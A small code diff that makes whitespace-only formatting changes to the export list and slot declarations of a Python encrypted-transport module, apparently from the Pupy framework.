@@ -2,7 +2,7 @@
 
 """ EC4 PSK transport """
 
-__all__ = [ 'EC4TransportServer', 'EC4TransportClient' ]
+__all__ = ['EC4TransportServer', 'EC4TransportClient']
 
 from ..base import BasePupyTransport
 from ...lib.picocmd.ecpv import ECPV
@@ -18,7 +18,7 @@ from Crypto.Hash import SHA384
 
 class EC4Transport(BasePupyTransport):
 
-    __slots__ = ( 'encryptor', 'decryptor', 'up_buffer' )
+    __slots__ = ('encryptor', 'decryptor', 'up_buffer')
 
     privkey = None
     pubkey  = None
